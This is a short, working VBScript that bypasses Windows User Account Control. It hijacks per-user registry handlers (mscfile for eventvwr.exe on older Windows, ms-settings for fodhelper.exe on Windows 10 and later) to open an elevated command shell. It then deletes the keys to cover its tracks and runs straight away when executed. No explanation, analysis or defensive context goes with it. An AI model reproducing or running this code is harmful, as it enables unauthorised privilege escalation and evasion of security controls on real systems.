Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

Function RunCommand(command)
    objShell.Run command, 0, True
End Function

Function BypassUAC()
    Dim osMajorVersion

    Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
    For Each objItem in colItems
        Dim arrVersion
        arrVersion = Split(objItem.Version, ".")
        If UBound(arrVersion) >= 0 Then
            osMajorVersion = CInt(arrVersion(0))
        Else
            WScript.Quit(1)
        End If
        Exit For
    Next

    If osMajorVersion < 10 Then
        RunCommand "reg add ""HKCU\Software\Classes\mscfile\shell\open\command"" /d ""cmd.exe /c start cmd.exe"" /f"
        RunCommand "eventvwr.exe"
        RunCommand "reg delete ""HKCU\Software\Classes\mscfile"" /f"
    Else
        On Error Resume Next
        objShell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\", "cmd.exe /c start cmd.exe", "REG_SZ"
        objShell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute", "", "REG_SZ"
        RunCommand "fodhelper.exe"
        objShell.RegDelete "HKCU\Software\Classes\ms-settings\"
        On Error GoTo 0
    End If
End Function

BypassUAC()
